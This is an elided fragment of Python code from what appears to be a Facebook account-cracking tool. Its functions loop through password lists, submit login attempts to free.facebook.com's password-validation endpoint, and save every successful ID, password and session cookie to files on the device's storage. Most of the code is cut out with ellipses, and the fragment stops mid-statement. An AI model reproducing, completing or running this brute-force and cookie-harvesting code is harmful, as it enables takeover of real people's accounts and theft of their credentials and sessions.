...
def __MTDFIVE__(ids, names, passlist, total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            ...
            if 'c_user' in log_cookies:
                ...
                #print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{coki}")
                oks.append(cid)
                open('/sdcard/zar0-M5-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/zar0-M5-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                break
...
def __MTDSIX__(ids, names, passlist, total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
